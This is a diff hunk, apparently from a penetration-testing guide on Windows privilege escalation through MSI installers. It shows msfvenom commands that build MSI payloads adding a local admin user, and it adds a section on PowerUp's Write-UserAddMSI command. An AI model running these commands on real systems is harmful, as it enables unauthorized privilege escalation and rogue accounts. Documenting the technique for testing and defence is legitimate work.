@@ -825,6 +825,16 @@ msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o a
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
 ```
 
+### PowerUP
+
+Use the `Write-UserAddMSI` command from power-up to create inside the current directory a Windows MSI binary to escalate privileges:
+
+```text
+Write-UserAddMSI
+```
+
+Just execute the created binary to escalate privileges.
+
 ### MSI Wrapper
 
 Read this tutorial to learn how to create a MSI wrapper using this tools:
